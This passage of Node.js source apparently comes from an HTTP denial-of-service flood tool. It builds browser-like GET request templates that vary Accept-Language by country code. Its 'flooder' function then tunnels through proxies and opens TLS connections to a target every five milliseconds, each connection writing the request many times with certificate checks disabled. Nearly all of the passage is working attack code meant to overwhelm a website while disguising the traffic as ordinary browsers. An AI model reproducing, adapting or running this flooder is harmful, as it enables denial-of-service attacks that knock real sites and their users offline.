            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: de-DE\r\nContent-Language: de-DE\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'AO':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: pt-AO\r\nContent-Language: pt-AO\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'TR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: tr-TR\r\nContent-Language: tr-TR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'MZ':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: pt-MZ\r\nContent-Language: pt-MZ\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'BE':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: fr-BE\r\nContent-Language: fr-BE\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'DO':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: es-DO\r\nContent-Language: es-DO\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'RS':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: rs-RS\r\nContent-Language: rs-RS\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'HR':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: hr-HR\r\nContent-Language: hr-HR\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        case 'ZW':
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: en-ZW\r\nContent-Language: en-ZW\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
        default :
            ss = `GET ${path} ${v_http}\r\nHost: ${host}\r\nReferer: ${referer}\r\nCookie: ${cookie}\r\nAccept: ${accepts}\r\nuser-agent: ${useragent}\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: ${encode}\r\nAccept-Language: ${langnotfound}\r\nContent-Language: ${langnotfound}\r\nCache-Control: ${controle}\r\nConnection: ${connect}\r\n\r\n`
        break;
    }

    flooder(proxy, uas, cookie, ss)

}

function flooder(proxy, ua, cookie, header) {

    logger(`[Flooder] ${color.cyan}[${proxy}]${color.reset} Start Flooding In ${httpversion}`)

    var br_proxie = proxy.split(':');
    var host = url.parse(target).host;

    setInterval( function() {


        var req = http.request({
            host: br_proxie[0],
            port: br_proxie[1],
            headers: {
                'User-Agent': ua,
                'Cookie': cookie
            },
            jar: rqJar,
            rejectUnauthorized: false,
            method: 'CONNECT',
            path: host +':443'
        },function() {
            req.setSocketKeepAlive(true);
        });

        req.on('connect', function (res, socket, head) {
            var TlsConnection = tls.connect({
                host: host,
                ciphers: 'kEECDH+ECDSA:kEECDH:kEDH:HIGH:MEDIUM:+3DES:+SHA:!RC4:!aNULL:!eNULL:!LOW:!MD5:!EXP',
                secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method_', 'TLSv1_3_method'], 
                servername: host,
                secure: true,
                requestCert: true,
                rejectUnauthorized: false,
                sessionTimeout: 10000,
                port: 443,
                socket: socket            
            }, function () {
                for (let j = 0; j < requeteperip; j++) {
                    TlsConnection.setKeepAlive(true, 10000)
                    TlsConnection.setTimeout(10000);
                    TlsConnection.write(header);
                }
            });

            TlsConnection.on('data', (chunk) => {
                setTimeout(function() {
                    TlsConnection.destroy();
                    return delete TlsConnection;
                }, 10000);
            });

        }).end();

    },5)


}

